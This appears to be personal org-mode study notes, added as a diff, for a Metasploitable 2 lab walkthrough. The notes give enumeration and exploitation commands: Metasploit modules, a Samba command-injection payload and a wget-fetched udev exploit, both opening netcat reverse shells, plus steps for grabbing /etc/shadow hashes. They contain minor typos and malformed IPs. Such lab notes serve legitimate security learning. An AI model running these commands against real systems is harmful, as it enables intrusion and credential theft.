@@ -1,0 +1,141 @@
+#+TAGS: sec ctf
+
+
+* Vuln Boxes
+* Boxes
+** Metasploitable
+** Metasploitable 2
+*** Walk Through with RWB on youtube
+https://www.youtube.com/watch?v=JGUoOotVXNQ
+**** Enumeration
+- netdiscover
+#+BEGIN_SRC sh
+netdiscover -r 192.168.56.0/24
+#+END_SRC
+
+- nmap of results from above
+#+BEGIN_SRC sh
+nmap -sV -p-65535 192.168.56.102
+#+END_SRC
+
+- open port 21 - decides to use telnet to confirm service
+#+BEGIN_SRC sh
+telent 192.168.0.102 21
+#+END_SRC
+
+- nmap udp scan
+#+BEGIN_SRC sh
+nmap -sU 192.168.0.102
+#+END_SRC
+
+**** Telnet
+Setting up wireshark to capture a telnet session login will allow the password to be caught.
+To view the session right click the packet in wire shack and slect follow tcp stream.
+
+**** VSFTP
+First determine the version, and then research known exploits
+
+- Using metasploit 
+does metasploit have any exploits for vsftp
+> search vsftp
+> use exploit/unix/ftp/vsftpd_234_backdoor
+> set rhost 192.168.0.102
+> exploit
+no prompt to acknowledge the shell
+- use the shell access to view /etc/passwd and /etc/shadow to grab users and password hashes
+  
+hash-identifier - this can be used on the found hashes to id the hash type
+
+Johnny - jtr gui
+  - create a file of the user and hases - uesr:hash*$ksjflsQ
+    
+- Using Manual Exploit
+The above exploit can be performed manually
+> ftp 192.168.0.102
+Name (192.168.56.102:root): a:)
+
+The above has created a backdoor on port 6200
+Use netcat to access the backdoor
+> nc -vvn 192.168.0.56.102 6200
+
+this will provide root shell
+
+**** Samba
+nmap shows that samba is running on 139 and 445
+  
+using metasploit aux module
+> use auxiliary/scanner/smb/smb_version
+> set rhosts 192.168.56.102
+> run
+this should return the version if available
+
+- using metasploit
+> search samba
+> use exploit/multi/samba/usermap_script
+> set rhost 192.168.56.102
+> exploit
+this should create a shell on the machone if it's vulnerable
+
+- manually
+using smbclient - similar in acton as ftp client
+> smbclient //metasploitable/tmp
+this should provide an anonymous user smb shell
+on the host machine use netcat to set up a listner
+> nc -lvnp 4444
+on the smb shell
+> logon "/=`nc 192.168.56.101 4444 -e /bin/bash`"
+should now have a shell connected to the listner
+
+**** DISTCC (Distributed C code across serveral machines on a network for compilation)
+Exploits used
+http://www.exploit-db.com/exploits/9915
+https://www.exploit-db.com/exploits/8572/
+
+nmap shows that dsitccd is running on port 3632 and the version is v1
+
+nmap nse script for distcc version
+#+BEGIN_SRC sh
+nmap -p 3632 192.168.56.102 --script=distcc-cve2004-2687 --script-agree="distcc-cve2004-2687.cmd='uname -a'"
+#+END_SRC
+this should return the output of the cmd
+
+- using metasploit
+> search distcc
+> use exploit/unix/misc/distcc_exec
+> set rhost 192.168.56.102
+> exploit
+Unlike above this will create an interactive shell, not just a single cmd
+using ps you can find if there is any other vectors to exploit
+on this machine there is a udev exploit available
+using searchsploit you can then check if udev has any know exploits
+> searchsploit udev
+this brings back an exploit linux/local/8572.c
+this needs to be put on the targets machine
+This can be done by hosting the file on apache
+> service apache2 start
+> cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www/html
+now on the target use wget to pull the file
+> cd /tmp
+> wget 192.168.56.101/8572.c -O msp2.c
+> touch run
+> echo '#!/bin/sh' > run
+> echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run
+> gcc msp2.c -o msp2
+> cat /proc/net/netlink
+note the pid (2344)
+on host run netcat listner
+> nc -lvnp 5555
+on target
+> chmod +x msp2 
+> ./msp2 2344
+Should now have a root shell on the netcat listner
+
+**** IngresLock Vuln
+Simple vuln that only requires telnet
+> telnet 192.168.56.102 1524
+that is it, should now have a root shell
+
+* Lecture
+* Tutorial
+* Books
+* Links
